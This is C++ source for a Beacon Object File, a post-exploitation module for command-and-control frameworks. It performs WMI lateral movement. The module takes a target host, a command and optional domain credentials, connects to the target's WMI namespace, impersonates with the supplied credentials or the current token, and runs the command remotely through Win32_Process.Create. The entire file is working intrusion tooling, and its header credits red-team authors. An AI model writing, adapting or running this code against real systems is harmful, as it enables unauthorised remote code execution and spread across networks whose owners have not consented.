/*
 * Credits: https://github.com/sliverarmory/HavocFrameworkModules
 * WMI Lateral Movement Via Create Process
 * Adopted From: https://wikileaks.org/ciav7p1/cms/page_11628905.html
 * Big big huge thanks for Raffi (rsmudge) for showing me how to create BOF with C++!
 * Modified by Phil Keeble (@The_Keeb) and Steve Embling to tie in aggressor and make it dynamic
 */

#include <windows.h>
#include <stdio.h>
#include <wbemcli.h>
//#include <comdef.h>
#include <combaseapi.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "comsuppwd.lib")

 /* spare us some name mangling... */
extern "C" {

#include "beacon.h"

	void go(char* buff, int len);

	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CLSIDFromString(wchar_t* lpsz, LPCLSID pclsid);
	DECLSPEC_IMPORT	    HRESULT  WINAPI	 	OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CoInitializeEx(LPVOID, DWORD);
	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE *asAuthSvc, void *pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void *pAuthList, DWORD dwCapabilities, void *pReserved3);
	DECLSPEC_IMPORT 	VOID     WINAPI		OLE32$CoUninitialize();
	DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
	DECLSPEC_IMPORT 	HRESULT  WINAPI	 	OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
	DECLSPEC_IMPORT 	VOID     WINAPI		OLEAUT32$VariantInit(VARIANTARG *pvarg);
	DECLSPEC_IMPORT	    HRESULT  WINAPI 	OLEAUT32$VariantClear(VARIANTARG *pvarg);
	DECLSPEC_IMPORT 	BSTR     WINAPI		OLEAUT32$SysAllocString(const OLECHAR *);
	DECLSPEC_IMPORT     VOID     WINAPI         OLEAUT32$SysFreeString(BSTR bstrString);
	DECLSPEC_IMPORT 	WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
	DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
	DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread();
	DECLSPEC_IMPORT 	WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
	DECLSPEC_IMPORT 	WINBASEAPI BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
	DECLSPEC_IMPORT 	WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
	DECLSPEC_IMPORT 	int      WINAPI		MSVCRT$swprintf(wchar_t* buffer, const wchar_t* format, ...);
	
	}

/* COM ignores the thread impersonation token unless cloaking is set.
 * Cloaking cannot be combined with an explicit COAUTHIDENTITY. */
static HRESULT SetProxySecurity(IUnknown* punk, COAUTHIDENTITY* authidentity, int IsCurrent)
{
	DWORD caps = (IsCurrent == 1) ? EOAC_DYNAMIC_CLOAKING : EOAC_NONE;
	RPC_AUTH_IDENTITY_HANDLE auth = (IsCurrent == 1) ? NULL : (RPC_AUTH_IDENTITY_HANDLE)authidentity;

	if (!punk)
		return E_POINTER;

	return OLE32$CoSetProxyBlanket(
		punk,
		RPC_C_AUTHN_WINNT,
		RPC_C_AUTHZ_NONE,
		NULL,
		RPC_C_AUTHN_LEVEL_CALL,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		auth,
		caps);
}

static HRESULT SetProxySecurityWithUnk(IUnknown* punk, COAUTHIDENTITY* authidentity, int IsCurrent, IID* iidUnk)
{
	IUnknown* pUnk = NULL;
	HRESULT hr = SetProxySecurity(punk, authidentity, IsCurrent);

	if (FAILED(hr))
		return hr;

	if (iidUnk && SUCCEEDED(punk->QueryInterface(*iidUnk, (void**)&pUnk)) && pUnk) {
		SetProxySecurity(pUnk, authidentity, IsCurrent);
		pUnk->Release();
	}
	return hr;
}

// Handle Cred material

void CreateCreds(COAUTHINFO** authInfo, COAUTHIDENTITY** authidentity, wchar_t* user, wchar_t* password, wchar_t* domain, int IsCurrent) {

	COAUTHIDENTITY* id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));


	{
		id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
		id->User = (USHORT*)user;
		id->Password = (USHORT*)password;
		id->Domain = (USHORT*)domain;
		id->UserLength = MSVCRT$wcslen((const wchar_t*)id->User);
		id->PasswordLength = MSVCRT$wcslen((const wchar_t*)id->Password);
		id->DomainLength = MSVCRT$wcslen((const wchar_t*)id->Domain);
		id->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
	}

	/* Use embedded identity only for alternate creds. When IsCurrent==1 the
	 * thread token (or process token) is used; pAuthIdentityData must be NULL. */
	if (IsCurrent == 1)
	{
		id = NULL;
	}

	COAUTHINFO* inf = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));

	{

		inf->dwAuthnSvc = RPC_C_AUTHN_WINNT;
		inf->dwAuthzSvc = RPC_C_AUTHZ_NONE;
		inf->pwszServerPrincName = NULL;
		inf->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
		inf->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
		inf->pAuthIdentityData = id;
		inf->dwCapabilities = EOAC_NONE;
	}

	*authidentity = id;
	*authInfo = inf;
}

void go(char* buff, int len) {
	HRESULT hr = S_OK;
	IWbemLocator* locator = NULL;
	COAUTHIDENTITY* authidentity = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
	COAUTHINFO* authInfo = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
	IWbemServices* pSvc = 0;
	IWbemClassObject* pClass = NULL;
	IWbemClassObject* pStartupObject = NULL;
	IWbemClassObject* pStartupInstance = NULL;
	IWbemClassObject* pInParamsDefinition = NULL;
	IWbemClassObject* pParamsInstance = NULL;

	wchar_t* Iwbmstr = OLEAUT32$SysAllocString(L"{dc12a687-737f-11cf-884d-00aa004b2e24}");
	wchar_t* Cwbmstr = OLEAUT32$SysAllocString(L"{4590f811-1d3a-11d0-891f-00aa004b2e24}");
	
	IID Iwbm;
	CLSID Cwbm;
	OLE32$CLSIDFromString(Cwbmstr, &Cwbm);
	OLE32$IIDFromString(Iwbmstr, &Iwbm);

	//BEACON operations
	datap parser;
	wchar_t* bwusername;
	wchar_t* bwpassword;
	wchar_t* bwdomain;
	wchar_t* bwcommandline;
	wchar_t* bwtarget2;
	int IsCurrent = 1;
	
	bwdomain = L"";
	bwusername = L"";
	bwpassword = L"";

	//BeaconDataParse(&parser, buf, len);
	BeaconDataParse(&parser, buff, len);
	{
		bwtarget2 =	(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwcommandline =	(wchar_t*)BeaconDataExtract(&parser, NULL);
		//IsCurrent = BeaconDataInt(&parser);
		bwdomain =	(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwusername =	(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwpassword =	(wchar_t*)BeaconDataExtract(&parser, NULL);
	}

	// Prepend "\\\\" to bwtarget2
	wchar_t* bwtarget = (wchar_t*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (MSVCRT$wcslen(bwtarget2) + 3) * sizeof(wchar_t));
	MSVCRT$swprintf(bwtarget, L"\\\\%s", bwtarget2);

	// Append "\\root\\cimv2" to bwtarget
	wchar_t* bwtarget3 = (wchar_t*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (MSVCRT$wcslen(bwtarget) + 12) * sizeof(wchar_t));
	MSVCRT$swprintf(bwtarget3, L"%s\\root\\cimv2", bwtarget);

	// Set bwtarget2 to bwtarget3
	bwtarget2 = bwtarget3;

	/* Alternate creds require a username and password (domain optional). */
	if (MSVCRT$wcslen(bwusername) > 0 && MSVCRT$wcslen(bwpassword) > 0) {
		IsCurrent = 0;
		BeaconPrintf(CALLBACK_OUTPUT, "Using supplied credentials\n");
	} else {
		HANDLE hTok = NULL;
		if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hTok)) {
			BeaconPrintf(CALLBACK_OUTPUT, "Using impersonated token\n");
			KERNEL32$CloseHandle(hTok);
		} else {
			BeaconPrintf(CALLBACK_OUTPUT, "Using current context\n");
		}
	}

	BeaconPrintf(CALLBACK_OUTPUT, "Command: %ls\n", bwcommandline);

	CreateCreds(&authInfo, &authidentity, bwusername, bwpassword, bwdomain, IsCurrent);

	if (IsCurrent == 1)
	{
		authidentity = NULL;
	}

	hr = OLE32$CoInitializeEx(0, COINIT_APARTMENTTHREADED);
	if (hr != RPC_E_CHANGED_MODE) {
		if (FAILED(hr)) {
				BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08lx", hr);
				return;
		}
	}

	/* Cloaking makes ConnectServer / DCOM use the thread token when present. */
	hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
	if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
		BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity failed: 0x%08lx", hr);
	}

	hr = OLE32$CoCreateInstance(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (void**)&locator);
	
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance failed: 0x%08x", hr);
		return;
	}

	// Take formatted target, user and password from beacon
	BSTR srv = OLEAUT32$SysAllocString(bwtarget2);
	BSTR usr = OLEAUT32$SysAllocString(bwusername);
	BSTR pass = OLEAUT32$SysAllocString(bwpassword);
	wchar_t domainuser_str[MAX_PATH] = L"";
	
	if (IsCurrent == 0) {
		/* Format the domain and username */
		BSTR domain_user;
		if (MSVCRT$wcslen(bwdomain) > 0) {
			MSVCRT$swprintf(domainuser_str, L"%ls\\%ls", bwdomain, bwusername);
		} else {
			MSVCRT$swprintf(domainuser_str, L"%ls", bwusername);
		}
		domain_user = OLEAUT32$SysAllocString(domainuser_str);
		/* Connect to the server */
		hr = locator->ConnectServer(srv, domain_user, pass, 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &pSvc);
	} else {
		hr = locator->ConnectServer(srv, NULL, NULL, 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &pSvc);
	}

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ConnectServer failed: 0x%08x", hr);
		return;
	}


	wchar_t* Iunkstr = OLEAUT32$SysAllocString(L"{00000000-0000-0000-C000-000000000046}");
	IID Iunk;
	OLE32$IIDFromString(Iunkstr, &Iunk);
	OLEAUT32$SysFreeString(Iunkstr);

	hr = SetProxySecurityWithUnk(pSvc, authidentity, IsCurrent, &Iunk);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "CoSetProxyBlanket failed: 0x%08x", hr);
		return;
	}

	BSTR wcClassName = OLEAUT32$SysAllocString(L"Win32_Process"); //Class name
	BSTR wcMethodName = OLEAUT32$SysAllocString(L"Create"); //Class name
	BSTR wcStartup = OLEAUT32$SysAllocString(L"Win32_ProcessStartup"); //Class name


	hr = pSvc->GetObject(wcClassName, 0, NULL, &pClass, NULL);

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "GetObject failed: 0x%08x", hr);
		return;
	}
	SetProxySecurity(pClass, authidentity, IsCurrent);

	//pInParamsDefinition will receive the paramters signature for the Win32_Process.Create(...) method. We should fill these params and call the method
	//We cannot ignore this step because the "Put" method later on will check for the parameter names.
	hr = pClass->GetMethod(wcMethodName, 0, &pInParamsDefinition, NULL);

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "GetMethod failed: 0x%08x", hr);
		return;
	}

	//We will fill the parameters in the pParamsInstance instance
	hr = pInParamsDefinition->SpawnInstance(0, &pParamsInstance);

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "SpawnInstance failed: 0x%08x", hr);
		return;
	}

	//Getting the Win32_ProcessStartup class definition. One of the parameters to the Win32_Process.Create() is a of type Win32_ProcessStartup, so we must create an object of that type and fill it
	hr = pSvc->GetObject(wcStartup, 0, NULL, &pStartupObject, NULL);

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "GetObject2 failed: 0x%08x", hr);
		return;
	}
	SetProxySecurity(pStartupObject, authidentity, IsCurrent);

	hr = pStartupObject->SpawnInstance(0, &pStartupInstance); //Create an instance of Win32_ProcessStartup

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "SpawnInstance2 failed: 0x%08x", hr);
		return;
	}

	//Let's now fill the the pStartupInstance instance, remember that after we fill it, we need to add it to the pParamsInstance


	//Filling the pStartupInstance
	{

		BSTR wcProcessStartupInfo = OLEAUT32$SysAllocString(L"ProcessStartupInformation");
		{
			BSTR wcShowWindow = OLEAUT32$SysAllocString(L"ShowWindow"); //This is the name of the propoerty, we can't change it!
			//Arg: create the arg
			VARIANT varParams;
			OLEAUT32$VariantInit(&varParams);
			varParams.vt = VT_I2;
			varParams.intVal = SW_SHOW;

			//Pass the arg to the Win32_ProcessStartup instance and clean it
			hr = pStartupInstance->Put(wcShowWindow, 0, &varParams, 0);
			OLEAUT32$VariantClear(&varParams);

			//Free String in Mem
			OLEAUT32$SysFreeString(wcShowWindow);
		}
		VARIANT vtDispatch;
		OLEAUT32$VariantInit(&vtDispatch);
		vtDispatch.vt = VT_DISPATCH;
		vtDispatch.byref = pStartupInstance;
		hr = pParamsInstance->Put(wcProcessStartupInfo, 0, &vtDispatch, 0);
		
		//Free String in mem
		OLEAUT32$SysFreeString(wcProcessStartupInfo);
	}

	//Handling command execution
	{
		//Arg: the command to be executed
		BSTR wcCommandLine = OLEAUT32$SysAllocString(L"CommandLine"); //This is the name of the propoerty, we can't change it!
		//BSTR wcCommandExecute = OLEAUT32$SysAllocString(L"cmd.exe /c \"whoami > c:\\wmi2.txt\"");
		BSTR wcCommandExecute = OLEAUT32$SysAllocString(bwcommandline);
		VARIANT varCommand;
		OLEAUT32$VariantInit(&varCommand);
		varCommand.vt = VT_BSTR;
		varCommand.bstrVal = wcCommandExecute;

		//Store the arg in the Win32_ProcessStartup and clean it
		hr = pParamsInstance->Put(wcCommandLine, 0, &varCommand, 0);
		varCommand.vt = VT_BSTR;
		varCommand.bstrVal = NULL;
		OLEAUT32$VariantClear(&varCommand);

		//Free Strings
		OLEAUT32$SysFreeString(wcCommandLine);
		OLEAUT32$SysFreeString(wcCommandExecute);
	}

	{

		BSTR wcCurrentDirectory = OLEAUT32$SysAllocString(L"CurrentDirectory"); //This is the name of the propoerty, we can't change it!
		VARIANT varCurrentDir;
		OLEAUT32$VariantInit(&varCurrentDir);
		varCurrentDir.vt = VT_BSTR;
		varCurrentDir.bstrVal = NULL;

		//Store the value for the in parameters
		hr = pParamsInstance->Put(wcCurrentDirectory, 0, &varCurrentDir, 0);
		OLEAUT32$VariantClear(&varCurrentDir);

		//Free String
		OLEAUT32$SysFreeString(wcCurrentDirectory);
	}

	//Execute Method
	IWbemClassObject* pOutParams = NULL;
	hr = pSvc->ExecMethod(wcClassName, wcMethodName, 0, NULL, pParamsInstance, &pOutParams, NULL);

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ExecMethod failed: 0x%08x", hr);
		return;
	}

	if (SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_OUTPUT, "ExecMethod Succeeded!");
	}

	hr = S_OK;

	// Free Strings in mem
	OLEAUT32$SysFreeString(Iwbmstr);
	OLEAUT32$SysFreeString(Cwbmstr);
	OLEAUT32$SysFreeString(srv);
	OLEAUT32$SysFreeString(usr);
	OLEAUT32$SysFreeString(pass);
	OLEAUT32$SysFreeString(wcClassName);
	OLEAUT32$SysFreeString(wcMethodName);
	OLEAUT32$SysFreeString(wcStartup);


}

